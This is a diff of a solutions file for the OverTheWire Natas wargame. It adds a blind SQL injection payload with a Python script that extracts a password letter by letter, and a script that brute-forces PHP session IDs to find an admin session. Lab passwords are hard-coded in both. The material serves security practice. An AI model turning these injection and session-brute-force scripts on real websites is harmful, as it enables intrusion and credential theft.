@@ -9,6 +9,9 @@ Requests
 Solution to RE00
 ++++++++++++++++++++++++++++
 
+Working script
+____________________________
+
 .. code-block:: python
 
     from requests.auth import HTTPBasicAuth
@@ -27,48 +30,81 @@ Solution to RE00
 Solution to RE01
 ++++++++++++++++++++++++++++
 
-..
-    Malicious query
-    ____________________________
+Malicious query
+____________________________
 
-    The user input that would escape the original query, and add the additional condition on the password is (for the first letter assumed to be "A"):
+The user input that would escape the original query, and add the additional condition on the password is (for the first letter assumed to be "A"):
 
-    .. code-block:: sql
+.. code-block:: sql
 
-        'natas16" AND password LIKE BINARY "A%'
+    'natas16" AND password LIKE BINARY "A%'
 
-    The full query will have then the form
+The full query will have then the form
 
-    .. code-block:: sql
+.. code-block:: sql
 
-        SELECT * from users where username="natas16" AND password LIKE BINARY "A%"
+    SELECT * from users where username="natas16" AND password LIKE BINARY "A%"
 
 
-    Working script
-    ____________________________
+Working script
+____________________________
 
-    .. code-block:: python
+.. code-block:: python
 
-        import requests
-        from requests.auth import HTTPBasicAuth
+    import requests
+    from requests.auth import HTTPBasicAuth
 
-        chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+    chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
 
-        URL = "http://natas15.natas.labs.overthewire.org"
+    URL = "http://natas15.natas.labs.overthewire.org"
 
-        auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
+    auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
 
-        template = 'natas16" AND password LIKE BINARY "{}%'
+    template = 'natas16" AND password LIKE BINARY "{}%'
 
-        letters = ""
+    letters = ""
 
-        for _ in range(32):
-            for letter in chars:
-                payload = {"username":template.format(letters+letter)}
-                r = requests.get(URL, auth=auth, params=payload)
-                if "This user exists" in r.text:
-                    letters += letter
-                    print(letters)
-                    break
+    for _ in range(32):
+        for letter in chars:
+            payload = {"username":template.format(letters+letter)}
+            r = requests.get(URL, auth=auth, params=payload)
+            if "This user exists" in r.text:
+                letters += letter
+                print(letters)
+                break
 
-        print("Password found {}".format(letters))
+    print("Password found {}".format(letters))
+
+Solution to RE02
+++++++++++++++++++++++++++++
+
+Working script
+____________________________
+
+.. code-block:: python
+
+    import requests
+    from requests.auth import HTTPBasicAuth
+    import re
+
+    URL = "http://natas18.natas.labs.overthewire.org"
+    auth=HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
+
+    for sess_id in range(10000):
+        print("Trying session ID {}".format(sess_id))
+        cookie = {"PHPSESSID":str(sess_id)}
+        payload = {"username":"x", "password":"y"}
+        r = requests.get(URL, auth=auth, cookies=cookie, params=payload)
+        if "You are logged in as a regular user." not in r.text:
+            print("Admin session ID found {}".format(sess_id))
+            password = re.search("Password: ([A-Za-z0-9]{32})", r.text)
+            if password:
+                print("Password: "+password.group(1))
+            else:
+                print("Password not found in the response")
+                print(r.text)
+            break
+        else:
+            print("FAILED")
+    else:
+        print("Brute force on Session ID failed")
